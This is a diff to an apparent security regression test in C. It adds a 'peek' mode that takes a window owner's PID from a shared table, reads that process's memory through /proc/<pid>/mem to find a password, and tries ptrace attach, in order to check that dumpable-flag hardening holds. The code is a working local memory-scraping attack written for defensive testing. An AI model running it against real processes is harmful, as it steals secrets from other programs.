@@ -92,6 +92,31 @@
  * wrong.
  *
  *   wsys_bypass keysend <path> <wid> <line> [tag]
+ *
+ * A FIFTH MODE, `peek`, is the attack that walks THROUGH every fix above.  The
+ * keystrokes left the mapping, so `snoop` can no longer read them -- but the
+ * victim still has them in its own address space, and on Linux a process can
+ * read another process of the SAME UID out of /proc/<pid>/mem without any
+ * ptrace call, without stopping it and without leaving a trace.  So this mode
+ * takes the ONE thing the world-readable table still gives away that matters
+ * here -- the owner's PID, which `snoop` already prints -- and turns it into
+ * the victim's memory:
+ *
+ *     snoop  ->  pid=1234  ->  open(/proc/1234/mem)  ->  the password
+ *
+ * It is the whole chain, driven end to end, because the interesting question is
+ * not whether /proc/<pid>/mem works (it does) but whether the window system's
+ * own hardening reaches a REAL window owner.  It reports:
+ *
+ *   mem=       the fd for /proc/<pid>/mem, or -errno
+ *   maps=      the fd for /proc/<pid>/maps, or -errno
+ *   enumerable= 1 if /proc/<pid>/fd could be listed
+ *   secret=    1 if <needle> was found in the victim's writable anonymous
+ *              memory -- the actual compromise, not a proxy for it
+ *   ptrace=    0 if PTRACE_ATTACH succeeded (detached again immediately),
+ *              else -1.  Driven LAST because an attach STOPS the victim.
+ *
+ *   wsys_bypass peek <path> <wid=N> <needle> [tag]
  */
 #define _GNU_SOURCE
 #include <errno.h>
@@ -101,10 +126,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <dirent.h>
 #include <sys/mman.h>
+#include <sys/ptrace.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/un.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 /* ---- the mirror, tracking user/linux-wsys.c exactly --------------------- */
@@ -333,8 +361,121 @@ static int snoop(const char *tag, const char *path, const char *victim)
     return 0;
 }
 
+/* peek <path> wid=<n> <needle> [tag]: the table gives up the owner's PID; the
+ * kernel is asked for the owner's MEMORY.
+ *
+ * Nothing here needs write access to anything, and nothing here needs the
+ * window system's cooperation: /proc/<pid>/mem is readable by any process of
+ * the same uid whose target is DUMPABLE, with no attach, no stop and no signal.
+ * That is the door prctl(PR_SET_DUMPABLE, 0) shuts, and Yama's ptrace_scope
+ * does NOT -- which is why both are set and why this mode measures the first
+ * one rather than the second. */
+static int peek(const char *tag, const char *path, const char *victim,
+                const char *needle)
+{
+    printf("== %s", tag);
+
+    int pid = -1;
+    struct stat st;
+    if (stat(path, &st) == 0) {
+        int fd = open(path, O_RDONLY);
+        if (fd >= 0) {
+            void *m = mmap(NULL, (size_t)st.st_size, PROT_READ, MAP_SHARED, fd, 0);
+            if (m != MAP_FAILED) {
+                const struct m_wshm *s = (const struct m_wshm *)m;
+                int want = (strncmp(victim, "wid=", 4) == 0) ? atoi(victim + 4) : -1;
+                for (int i = 0; i < WSYS_MAX_WINDOWS; i++)
+                    if (s->win[i].used && s->win[i].wid == want) {
+                        pid = s->win[i].pid; break;
+                    }
+                munmap(m, (size_t)st.st_size);
+            }
+            close(fd);
+        }
+    }
+    printf(" pid=%d", pid);
+    if (pid <= 0) { printf(" mem=0 secret=0 enumerable=0 ptrace=0 found=0\n");
+                    return 0; }
+    printf(" found=1");
+
+    char p[64];
+    snprintf(p, sizeof p, "/proc/%d/mem", pid);
+    int mem = open(p, O_RDONLY);
+    printf(" mem=%d", mem >= 0 ? mem : -errno);
+
+    snprintf(p, sizeof p, "/proc/%d/maps", pid);
+    int mf = open(p, O_RDONLY);
+    printf(" maps=%d", mf >= 0 ? mf : -errno);
+
+    /* THE SECRET.  Walk EVERY writable region of the victim and search it for
+     * the needle.  Bounded: 64 MiB total, so a browser-sized victim cannot turn
+     * this gate into a long-running scan.
+     *
+     * "EVERY writable region", not "every ANONYMOUS writable region", and the
+     * difference is not cosmetic -- it is the destructive-witness trap this
+     * file has been caught by twice, wearing a new coat.  The first draft
+     * skipped file-backed mappings on the reasoning that a keystroke buffer
+     * lives on the heap or the stack.  It does not: tests/linux/wsys_uidgate.ad
+     * reads into `rbuf`, a top-level BSS array, and a small .bss sits inside the
+     * BINARY's own rw- mapping, which /proc/<pid>/maps prints WITH a pathname.
+     * So the scan skipped the one page the password was on, and printed
+     * secret=0 -- on the run with the fix REVERTED, where /proc/<pid>/mem was
+     * wide open and returned the bytes on request.  A gate that answers "no
+     * leak" because it looked in the wrong place is the same failure as one
+     * that answers "no leak" because it looked at nothing. */
+    int secret = 0;
+    if (mem >= 0 && mf >= 0) {
+        FILE *f = fdopen(mf, "r");
+        char line[512];
+        size_t budget = 64u << 20;
+        static char buf[1u << 20];
+        size_t nl = strlen(needle);
+        while (f && !secret && fgets(line, sizeof line, f)) {
+            unsigned long lo, hi;
+            char perms[8];
+            if (sscanf(line, "%lx-%lx %7s", &lo, &hi, perms) != 3) continue;
+            if (perms[0] != 'r' || perms[1] != 'w') continue;
+            if (strstr(line, "[vvar")) continue;      /* not readable this way */
+            for (unsigned long a = lo; a < hi && !secret && budget; ) {
+                size_t want = hi - a > sizeof buf ? sizeof buf : (size_t)(hi - a);
+                if (want > budget) want = budget;
+                ssize_t got = pread(mem, buf, want, (off_t)a);
+                if (got <= 0) break;
+                budget -= (size_t)got;
+                if ((size_t)got >= nl && memmem(buf, (size_t)got, needle, nl))
+                    secret = 1;
+                a += (unsigned long)got;
+            }
+        }
+        if (f) fclose(f); else close(mf);
+    } else if (mf >= 0) close(mf);
+    if (mem >= 0) close(mem);
+    printf(" secret=%d", secret);
+
+    snprintf(p, sizeof p, "/proc/%d/fd", pid);
+    DIR *d = opendir(p);
+    int enumerable = 0;
+    if (d) { while (readdir(d)) enumerable = 1; closedir(d); }
+    printf(" enumerable=%d", enumerable);
+
+    /* LAST: an attach STOPS the victim, so nothing may observe it afterwards.
+     * PTRACE_ATTACH from a non-parent is what Yama's ptrace_scope=1 refuses and
+     * what PR_SET_DUMPABLE(0) refuses independently of Yama. */
+    long r = ptrace(PTRACE_ATTACH, (pid_t)pid, NULL, NULL);
+    if (r == 0) {
+        int ws; waitpid((pid_t)pid, &ws, 0);
+        ptrace(PTRACE_DETACH, (pid_t)pid, NULL, NULL);
+    }
+    printf(" ptrace=%d\n", r == 0 ? 0 : -1);
+    return 0;
+}
+
 int main(int argc, char **argv)
 {
+    /* peek <path> <wid=N> <needle> [tag] */
+    if (argc >= 5 && strcmp(argv[1], "peek") == 0)
+        return peek(argc >= 6 ? argv[5] : "peek", argv[2], argv[3], argv[4]);
+
     /* snoop <path> <victim> [tag] */
     if (argc >= 4 && strcmp(argv[1], "snoop") == 0)
         return snoop(argc >= 5 ? argv[4] : "snoop.table", argv[2], argv[3]);
